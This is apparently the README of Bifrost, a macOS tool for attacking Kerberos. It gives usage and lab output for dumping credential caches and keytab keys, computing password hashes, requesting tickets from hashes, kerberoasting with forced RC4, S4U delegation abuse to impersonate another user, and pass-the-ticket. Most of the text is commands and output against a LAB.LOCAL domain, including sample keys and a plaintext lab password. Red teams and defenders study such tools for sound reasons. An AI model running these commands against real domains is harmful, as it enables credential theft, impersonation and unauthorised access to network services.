# Bifrost

```
  ___         ___                   _   
 (  _`\  _  /'___)                 ( )_ 
 | (_) )(_)| (__  _ __   _     ___ | ,_)
 |  _ <'| || ,__)( '__)/'_`\ /',__)| |  
 | (_) )| || |   | |  ( (_) )\__, \| |_ 
 (____/'(_)(_)   (_)  `\___/'(____/`\__)
                                        
```
```
Usage:
./bifrost -action [dump | list | askhash | describe | asktgt | asktgs | s4u | ptt | remove]
For dump action:
    -source [tickets | keytab]
        for keytab, optional -path to specify a keytab
        for tickets, optional -name to specify a ccache entry to dump
For list action:
     no other options are necessary
For askhash action:
    -username a.test -password 'mypassword' -domain DOMAIN.COM
         optionally specify -enctype [aes256 | aes128 | rc4] or get all of them
         optionally specify -bpassword 'base64 of password' in case there might be issues with parsing or special characters
For asktgt action:
    -username a.test -domain DOMAIN.COM
         if using a plaintext password, specify -password 'password'
         if using a hash, specify -enctype [aes256 | aes128 | rc4] -hash [hash_here]
             optionally specify -tgtEnctype [aes256|aes128|rc4] to request a TGT with a specific encryption type
             optionally specify -supportAll false to indicate that you want a TGT to match your hash enctype, otherwise will try to get AES256
         if using a keytab, specify -enctype and -keytab [keytab path] to pull a specific hash from the keytab
             optionally specify -tgtEnctype [aes256|aes128|rc4] to request a TGT with a specific encryption type
             optionally specify -supportAll false to indicate that you want a TGT to match your hash enctype, otherwise will try to get AES256
For describe action:
    -ticket base64KirbiTicket
For asktgs action:
    -ticket [base64 of TGT]
    -service [comma separated list of SPNs]
     optionally specify -connectDomain to connect to a domain other than the one specified in the ticket
     optionally specify -serviceDomain to request a service ticket in a domain other than the one specified in the ticket
     optionally specify -kerberoast true to indicate a request for rc4 instead of aes256
For s4u:
    -ticket [base64 of TGT]
    -targetUser [target user in current domain, or targetuser@domain for a different domain]
    -spn [target SPN] (if this isn't specified, just a forwardable S4U2Self ticket is requested as targetUser)
     optionally specify -connectDomain [domain or host to connect to]
For ptt:
    -ticket [base64 of kirbi ticket]
     optionally specify -name [name] to import the ticket into a specific credential cache
     optionally specify -name new to import the ticket into a new credential cache
For remove:
     for tickets: -source tickets -name [name here] (removes an entire ccache)
     for keytabs: -source keytab -principal [principal name] (removes all entries for that principal)
     for keytabs: optionally specify -name to not use the default keytab
     you can't remove a specific ccache principal entry since it seems to not be implemented in heimdal
```
# Table of Contents
- [Overview](#overview)
- commands
    - [list](#list)
    - [dump](#dump)  
        - [tickets](#tickets)  
        - [keytab](#keytab)  
    - [askhash](#askhash)  
    - [asktgt](#asktgt)
        - [with plaintext](#with-plaintext-password)    
        - [with hash](#with-hash)
        - [with keytab entry](#with-keytab-entry)
    - [describe](#describe)
    - [asktgs](#asktgs)
        - [different domains](#different-domains)
        - [kerberoasting](#kerberoasting)
    - [s4u](#s4u)
    - [ptt](#ptt)
    - [remove](#remove)
        - [credential cache](#credential-cache)
        - [keytab entry](#keytab-entry)
        
## Overview
Bifrost is an Objective-C project designed to interact with the Heimdal krb5 APIs on macOS. Bifrost compiles into a static library (but you can change that to a dylib if needed), and bifrostconsole is a simple console project that uses the Bifrost library. 
## list
The `-action list` command will loop through all of the credential caches in memory and give basic information about each cache and each entry within. It will also identify the default cache with the `[*]` marker and each other cache with the `[+]` marker.
```
spooky:~ lab_admin$ ./bifrost -action list
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 


[*] Principal: lab_admin@LAB.LOCAL
    Name: API:A74E8799-8173-4D1A-8C7D-AFD2D8B003F3
    Issued             Expires                Principal                    Flags
2019-11-13 18:00:20PST    2019-11-14 04:00:20PST    krbtgt/LAB.LOCAL@LAB.LOCAL    (forwardable renewable initial pre-auth )
1970-12-31 16:00:00PST    2019-12-13 18:00:21PST    krb5_ccache_conf_data/kcm-status@X-CACHECONF:    ()
```
## dump
The `-action dump` command can extract information about keytabs or credential caches based on the flags.
### tickets
To dump tickets specifically,  use `-source tickets`. By default, this will only iterate through the default credential cache. The default credential cache can be identified with the `-action list` command and looking for the cache identified with a `[*]` marker. To dump a specific credential cache, use the `-name [name here]` flag. 

Each ticket will be described and dumped into a base64 Kirbi format that can then be used for other commands or with other tools on Windows.
```
spooky:~ lab_admin$ ./bifrost -action dump  -source tickets
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 


Client: lab_admin@LAB.LOCAL
Principal: krbtgt/LAB.LOCAL@LAB.LOCAL
Key enctype: aes256
Key: DUpykxCguZ9JtWML38nygb5Yyhvd1nGvy+MGReD7sXU= (0D4A729310A0B99F49B5630BDFC9F281BE58CA1BDDD671AFCBE30645E0FBB175)
Expires: 2019-11-14 12:00:20 GMT
Flags: forwardable renewable initial pre-auth 
Kirbi:
doIFIDCCBRygBgIEAAA<...snip...>TE9DQUw=


Client: lab_admin@LAB.LOCAL
Principal: krb5_ccache_conf_data/kcm-status@X-CACHECONF:
Key enctype: 0
Key:  ()
Expires: 2019-12-14 02:00:21 GMT
Flags: 
Principal type: kcm-status
Ticket Data: 
a3JiNQAAAAEAAAAA
```
### keytab
To dump keytab keys, use the `-source keytab` parameter. By default, this will attempt to dump information from the default keytab (`/etc/krb5.keytab`) which is only readable by root. To specify another keytab, use the `-path /path/to/keytab` argument.

Each keytab entry will be described and the key will be dumped in base64 and hex.
```
spooky:~ lab_admin$ ./bifrost -action dump -source keytab -path test
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] Resolving keytab path
[+] Successfully opened keytab
[+] principal: lab_admin@LAB.LOCAL
    Entry version: 3
    Key enctype: aes256
    Key: 2DE49D76499F89DEA6DFA62D0EA7FEDFD108EC52936740E2450786A92616D1E1
    Timestamp: 2019-11-10 04:58:09 GMT
```
```
bash-3.2$ sudo ./bifrost -action dump -source keytab
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] Resolving default keytab path
[+] Successfully opened keytab
[+] principal: afpserver/LKDC:SHA1.B58C56AD77898DE69AAEFD22A538D6EDDEFF8D47@LKDC:SHA1.B58C56AD77898DE69AAEFD22A538D6EDDEFF8D47
    Entry version: 2
    Key enctype: aes256
    Key: 75769776DD087E3C951C514F5DB8A8FAC9DF7BF0EC6FA50A8362C456146B833B
    Timestamp: 2018-10-27 03:26:13 GMT
[+] principal: cifs/LKDC:SHA1.B58C56AD77898DE69AAEFD22A538D6EDDEFF8D47@LKDC:SHA1.B58C56AD77898DE69AAEFD22A538D6EDDEFF8D47
    Entry version: 2
    Key enctype: aes256
    Key: 75769776DD087E3C951C514F5DB8A8FAC9DF7BF0EC6FA50A8362C456146B833B
    Timestamp: 2018-10-27 03:26:13 GMT
    <...snip...>
[+] principal: spooky$@LAB.LOCAL
    Entry version: 2
    Key enctype: rc4
    Key: A12AD40BD124E6A9A14D65504E8EA30A
    Timestamp: 2019-11-14 02:11:20 GMT
[+] principal: spooky$@LAB.LOCAL
    Entry version: 2
    Key enctype: aes256
    Key: C1BF6861A00B35A97483E820863FAD4ED57831D935DBFE2D501727C678503F73
    Timestamp: 2019-11-14 02:11:20 GMT
[+] principal: spooky$@LAB.LOCAL
    Entry version: 2
    Key enctype: aes128
    Key: 1F44A5E5C7919C00F3166A1344D4FFDA
```
## askhash
The `-action askhash` will compute the necessary hashes used to request TGTs and decrypt responses. This command requires the plaintext password with `-password [password here]`, but if the passwoord contains special characters that might cause issues, you can always supply a base64 encoded version of the password with `-bpassword [base64 password here]`. You must also supply the `-username [username]` and `-domain fqdn` parameters so that the proper salt can be generated. 

If you're wanting to get the hashes for a computer$ account, make sure to include the `$` in the username. The salt for a computer account is different than the salt for a user account.
```
spooky:~ lab_admin$ ./bifrost -action askhash -username  lab_admin -domain lab.local -bpassword YWJjMTIzISEh
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 


Username: lab_admin
Password: abc123!!!
Domain: LAB.LOCAL
Salt: LAB.LOCALlab_admin

Keys:
AES128: CFE28C26EAF8DE4A0A2AE0CC69E6EB6B
AES256: 2DE49D76499F89DEA6DFA62D0EA7FEDFD108EC52936740E2450786A92616D1E1
RC4   : 8C1A1B4466CB7F145CAB016435B893EF
```
## asktgt
The `-action asktgt` command will take a plaintext password, a hash, or a keytab entry and request a TGT from the DC.  
### with plaintext password
To use a plaintext password, you need to supply `-username [username]` and `-domain [fqdn]` in addition to `-password [password]`. If the password contains special characters that might cause issues, supply the `-bpassword [base64 of password]` instead. This will use Kerberos Login APIs to request a TGT normally and store it into a new credential cache. Bifrost will then extract the ticket from that cache and remove the cache.
```
spooky:~ lab_admin$ ./bifrost -action asktgt -username lab_admin -domain lab.local -bpassword YWJjMTIzISEh
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] Requesting principal: lab_admin@LAB.LOCAL
[*] Requesting password: abc123!!!
[*] Creating TGT Request for lab_admin@LAB.LOCAL
[*] Requesting TGT into temporary CCache
[+] Successfully got TGT into new CCache: API:A74E8799-8173-4D1A-8C7D-AFD2D8B003F3
[*] Dumping ticket from new CCache and removing entry

Client: lab_admin@LAB.LOCAL
Principal: krbtgt/LAB.LOCAL@LAB.LOCAL
Key enctype: aes256
Key: lFfEz+OGE0IrlRiNbqN3KbkH1cC0Sb28eVJ8V2yp3EM= (9457C4CFE38613422B95188D6EA37729B907D5C0B449BDBC79527C576CA9DC43)
Expires: 2019-11-14 12:28:25 GMT
Flags: forwardable initial pre-auth 
Kirbi:
doIFDTCCBQm<...snip...>TA==

[+] Removed CCache entry: API:A74E8799-8173-4D1A-8C7D-AFD2D8B003F3
[+] Successfully obtained Kerberos ticket for principal lab_admin.
```
### with hash
To use a hash, you need to supply `-username [username]` and `-domain [fqdn]` in addition to `-hash [hash here]` and `-enctype [aes256|aes128|rc4|des3]`.  With just these paramters, Bifrost will construct manual ASN1 Kerberos traffic and connect to `[fqdn]` on port 88 to request an AES256 TGT (specifically, listing aes256, aes128, and rc4 as valid return encryption types). This can be modified of course. Specifying the `-supportAll false` flag will adjust the traffic so that the only supported encryption response type is the same as the hash. Alternatively, you can specify `-tgtEnctype [aes256|aes128|rc4]` to request a TGT of a specific encryption type regardless of the hash type supplied.
```
spooky:~ lab_admin$ ./bifrost -action asktgt -username lab_admin -domain lab.local -enctype aes256 -hash 2DE49D76499F89DEA6DFA62D0EA7FEDFD108EC52936740E2450786A92616D1E1 -tgtEnctype rc4
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] Requesting hash type: 23
[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[+] Successfully sent ASREQ
[+] Successfully received ASREP
[*] Describing ticket
Client: lab_admin@LAB.LOCAL
Principal: krbtgt/LAB.LOCAL@LAB.LOCAL
Start: 2019-11-14 02:33:11 GMT
End:   2019-11-14 12:33:11 GMT
Renew: 2019-11-21 02:33:11 GMT
Key Type: ARCFOUR_HMAC
Key Value: P7EYn0Y5BFcE7o0gONzEhQ== (3FB1189F4639045704EE8D2038DCC485)
Flags: forwardable renewable initial pre-auth 
[*] Creating Kirbi:
doIFADCCBPygBgI<...snip...>FCLkxPQ0FM
```
### with keytab entry
To use a keytab, you need  to supply `-username [username]` and `-domain [fqdn]` in addition to `-enctype [aes256|aes128|rc4]` and `-keytab [path to keytab]`. Bifrost will then open the keytab and search for the entry that matches the supplied username, domain, and encryption type and pull that hash. With just these paramters, Bifrost will construct manual ASN1 Kerberos traffic and connect to `[fqdn]` on port 88 to request an AES256 TGT (specifically, listing aes256, aes128, and rc4 as valid return encryption types). This can be modified of course. Specifying the `-supportAll false` flag will adjust the traffic so that the only supported encryption response type is the same as the hash. Alternatively, you can specify `-tgtEnctype [aes256|aes128|rc4]` to request a TGT of a specific encryption type regardless of the hash type supplied.
```
spooky:~ lab_admin$ ./bifrost -action asktgt -username lab_admin -domain lab.local -enctype aes256 -keytab test
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] Resolving keytab path: test
[+] Successfully opened keytab
[*] Searching for principal: lab_admin@LAB.LOCAL
[*] Found match, retrieving key
[+] Using hash: 2DE49D76499F89DEA6DFA62D0EA7FEDFD108EC52936740E2450786A92616D1E1
[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[+] Successfully sent ASREQ
[+] Successfully received ASREP
[*] Describing ticket
Client: lab_admin@LAB.LOCAL
Principal: krbtgt/LAB.LOCAL@LAB.LOCAL
Start: 2019-11-14 02:35:16 GMT
End:   2019-11-14 12:35:16 GMT
Renew: 2019-11-21 02:35:16 GMT
Key Type: AES256_CTS_HMAC_SHA1_96
Key Value: 4YgDg1Y8kIGg1xvfTpSmigdPo3KkdAqBMj54dSnXJtM= (E1880383563C9081A0D71BDF4E94A68A074FA372A4740A81323E787529D726D3)
Flags: forwardable renewable initial pre-auth 
[*] Creating Kirbi:
doIFIDCCBR<...snip...>DQUw=
```
## describe
The `-action describe` command will parse out the information of a Kirbi file. You need to supply `-ticket [base64 of Kirbi ticket]`.
```
spooky:~ lab_admin$ ./bifrost -action describe -ticket doIFIDCCBRygBgIEAA<...snip...>Uw=
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

Client: lab_admin@LAB.LOCAL
Principal: krbtgt/LAB.LOCAL@LAB.LOCAL
Start: 2019-11-14 02:35:16 GMT
End:   2019-11-14 12:35:16 GMT
Renew: 2019-11-21 02:35:16 GMT
Key Type: AES256_CTS_HMAC_SHA1_96
Key Value: 4YgDg1Y8kIGg1xvfTpSmigdPo3KkdAqBMj54dSnXJtM= (E1880383563C9081A0D71BDF4E94A68A074FA372A4740A81323E787529D726D3)
Flags: forwardable renewable initial pre-auth 
```
## asktgs
The `-action asktgs` command will ask the KDC for a service ticket based on a supplied TGT. You need to supply `-ticket [base64 of kirbi TGT]` and `-service [spn,spn,spn]`. 
```
spooky:~ lab_admin$ ./bifrost -action asktgs -ticket doIFIDC<...snip...>Uw= -service cifs/dc1-lab.lab.local,host/dc1-lab.lab.local
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[*] Requesting service ticket to cifs/dc1-lab.lab.local as lab_admin
[+] Successfully sent TGSREQ
[+] Successfully received TGSREP
[+] Parsing TGS-REP
Client Domain: LAB.LOCAL
Requesting account: lab_admin
Requested Service: cifs/dc1-lab.lab.local
Ticket Encryption: 23
[*] Describing ticket
Client: lab_admin@LAB.LOCAL
Principal: cifs/dc1-lab.lab.local@LAB.LOCAL
Start: 2019-11-14 02:43:39 GMT
End:   2019-11-14 12:35:16 GMT
Renew: 2019-11-21 02:35:16 GMT
Key Type: ARCFOUR_HMAC
Key Value: 06IYcTPmajAEvXCjTim9lA== (D3A2187133E66A3004BD70A34E29BD94)
Flags: forwardable renewable pre-auth 
[*] Creating Kirbi:
doIFEDCCBQ<...snip...>A==
[+] Successfully got service ticket
[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[*] Requesting service ticket to host/dc1-lab.lab.local as lab_admin
[+] Successfully sent TGSREQ
[+] Successfully received TGSREP
[+] Parsing TGS-REP
Client Domain: LAB.LOCAL
Requesting account: lab_admin
Requested Service: host/dc1-lab.lab.local
Ticket Encryption: 18
[*] Describing ticket
Client: lab_admin@LAB.LOCAL
Principal: host/dc1-lab.lab.local@LAB.LOCAL
Start: 2019-11-14 02:43:39 GMT
End:   2019-11-14 12:35:16 GMT
Renew: 2019-11-21 02:35:16 GMT
Key Type: AES256_CTS_HMAC_SHA1_96
Key Value: JGWDGXrjkzMD5Tr4dv+b6a5fR97IY8ycwoz1bHsywJw= (246583197AE3933303E53AF876FF9BE9AE5F47DEC863CC9CC28CF56C7B32C09C)
Flags: forwardable renewable pre-auth ok-as-delegate 
[*] Creating Kirbi:
doIFL<...snip...>w=
[+] Successfully got service ticket
```
### different domains
By default, Bifrost will look to the TGT for information about the domain to connect to and the domain for the service. If either of these things differ from the TGT, you can specify them manually with `-connectDomain [domain to connect to]` and `-serviceDomain [domain of the service]`.  By default, Bifrost specifies that aes256, aes128, and rc4 encryption types for the resulting service are acceptable (so you'll most likely get back an aes256 service ticket). 
### kerberoasting
If you don't want to get an aes256 service ticket back, but instead want something more crackable, you can specify the `-kerberoast true` flag to indicate that you want the resulting service ticket to be rc4.
```
spooky:~ lab_admin$ ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[*] Requesting service ticket to host/dc1-lab.lab.local as lab_admin
[+] Successfully sent TGSREQ
[+] Successfully received TGSREP
[+] Parsing TGS-REP
Client Domain: LAB.LOCAL
Requesting account: lab_admin
Requested Service: host/dc1-lab.lab.local
Ticket Encryption: 23
[*] Describing ticket
Client: lab_admin@LAB.LOCAL
Principal: host/dc1-lab.lab.local@LAB.LOCAL
Start: 2019-11-14 02:49:01 GMT
End:   2019-11-14 12:46:50 GMT
Renew: 2019-11-21 02:46:50 GMT
Key Type: ARCFOUR_HMAC
Key Value: j3VcAqIgsLI38a4aqi0jOw== (8F755C02A220B0B237F1AE1AAA2D233B)
Flags: forwardable renewable pre-auth ok-as-delegate 
[*] Creating Kirbi:
doIFE<...snip...>A==
[+] Successfully got service ticket
```
## s4u
The `-action s4u` command utilizes resource-based constrained delegatioon. You need to specify `-ticket [base64 of TGT]`, `-targetUser [username]` (if the user is in another domain than the one the TGT is for, specify the target user as `username@otherdomain.com`). At this point, Bifrost will only do the  S4U2Self process. To  complete the process and also do the S4U2Proxy, additionally specify `-spn [target spn]`. If you need to connect to a different domain than the one specified in the TGT, you can specify `-connectDomain [fqdn]`. This sequence will again craft manual ASN1 Kerberos traffic over port 88.
```
*** Using the TGT of the "alice" account, which has an SPN set (HTTP/spooky.lab.local) and has the userAccountControl flag for TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION set to true (0x1000000) and has msDS-AllowedToDelegateTo set to the SPN of cifs/dc1-lab.lab.local ***

spooky:~ lab_admin$ ./bifrost -action s4u -targetUser lab_admin -spn cifs/dc1-lab.lab.local -ticket doIF<...snip...>QUw=
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[*] Requesting service ticket to alice as lab_admin
[+] Successfully sent request
[+] Successfully received response
[+] Parsing TGS-REP
Client Domain: LAB.LOCAL
Requesting account: lab_admin@LAB.LOCAL
Requested Service: alice
Ticket Encryption: 23
[*] Describing ticket
Client: lab_admin@LAB.LOCAL@LAB.LOCAL
Principal: alice@LAB.LOCAL
Start: 2019-11-14 04:17:45 GMT
End:   2019-11-14 13:59:56 GMT
Renew: 2019-11-21 03:59:56 GMT
Key Type: ARCFOUR_HMAC
Key Value: MV4AR2rIg23e8uj0LmuP4w== (315E00476AC8836DDEF2E8F42E6B8FE3)
Flags: forwardable renewable pre-auth 
[*] Creating Kirbi:
doIFQD<...snip...>ZQ==
[*] Impersonating lab_admin@LAB.LOCAL to service cifs/dc1-lab.lab.local@LAB.LOCAL via S4U2Proxy
[*] LAB.LOCAL resolved to : 192.168.205.150
[+] Successfully connected to remote domain
[+] Successfully sent request
[+] Successfully received response
[+] Parsing TGS-REP
Client Domain: LAB.LOCAL
Requesting account: lab_admin@LAB.LOCAL
Requested Service: cifs/dc1-lab.lab.local
Ticket Encryption: 18
[*] Describing ticket
Client: lab_admin@LAB.LOCAL@LAB.LOCAL
Principal: cifs/dc1-lab.lab.local@LAB.LOCAL
Start: 2019-11-14 04:17:45 GMT
End:   2019-11-14 13:59:56 GMT
Renew: 2019-11-21 03:59:56 GMT
Key Type: AES256_CTS_HMAC_SHA1_96
Key Value: qvO9Rh88ju+LlobxDwdS9fAy9MjqVg/FOfS/RCxVOlo= (AAF3BD461F3C8EEF8B9686F10F0752F5F032F4C8EA560FC539F4BF442C553A5A)
Flags: forwardable renewable pre-auth ok-as-delegate 
[*] Creating Kirbi:
doIG<...snip...>9jYWw=
```
You can now use that final Kirbi ticket to access `cifs/dc1-lab.lab.local` as `lab_admin` even though the TGT used for the whole process was that of  `LAB\alice`. 
## ptt
The `-action ptt` command takes a ticket (TGT or service ticket) and imports it to a specified credential cache or creates a new credential cache. You need to specify `-ticket [base64 of ticket]` and either `-name [full credential cache name]` to add the ticket to the specified cache, or `-name new` to create a new credential cache and import the ticket  there.
```
spooky:~ lab_admin$ ./bifrost -action list
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

spooky:~ lab_admin$ ./bifrost -action ptt -cache new -ticket doI<...snip...>QUw=
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[+] Successfully parsed Kirbi data
[*] Converting ticket to ccache cred
[+] Successfully converted ticket to ccache cred
[*] Creating new ccache
[*] Saving credential for krbtgt/LAB.LOCAL
[+] Successfully imported credential
spooky:~ lab_admin$ ./bifrost -action list
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 


[*] Principal: lab_admin@LAB.LOCAL
    Name: API:9C9CE38B-DEC1-42DF-8401-E61A39B3267F
    Issued             Expires                Principal                    Flags
2019-11-13 18:58:06PST    2019-11-14 04:58:06PST    krbtgt/LAB.LOCAL@LAB.LOCAL    (forwardable renewable initial pre-auth )
```
## remove
The `-action remove` command removes caches or keytab entries.
### credential cache
To remove a credential cache, you need to specify `-source tickets` and `-name [cache name  here]`. This remove the entire cache. As far as I can tell with the krb5 Heimdal APIs, you cannot remove a specific credential entry - the MITKerberosShim reports that the required functions aren't implemented.
```
spooky:~ lab_admin$ ./bifrost -action list
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 


[*] Principal: lab_admin@LAB.LOCAL
    Name: API:9C9CE38B-DEC1-42DF-8401-E61A39B3267F
    Issued             Expires                Principal                    Flags
2019-11-13 18:58:06PST    2019-11-14 04:58:06PST    krbtgt/LAB.LOCAL@LAB.LOCAL    (forwardable renewable initial pre-auth )
spooky:~ lab_admin$ ./bifrost -action remove -source tickets -name API:9C9CE38B-DEC1-42DF-8401-E61A39B3267F
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

[*] Resolving CCache name: API:9C9CE38B-DEC1-42DF-8401-E61A39B3267F
[+] Successfully resolved CCache name
[+] Successfully removed CCache
spooky:~ lab_admin$ ./bifrost -action list
 ___         ___                   _     
(  _`\  _  /'___)                 ( )_  
| (_) )(_)| (__  _ __   _     ___ | ,_)  
|  _ <'| || ,__)( '__)/'_`\ /',__)| |   
| (_) )| || |   | |  ( (_) )\__, \| |_ 
(____/'(_)(_)   (_)  `\___/'(____/\__) 

spooky:~ lab_admin$ 

```
### keytab entry
To remove a principal from a keytab, you need to specify `-source keytab` and `-principal [principal name]`. By default, this will look for the principal in the default keytab, but if you want to use a specific keytab, specify it with `-name [path to keytab]`. 

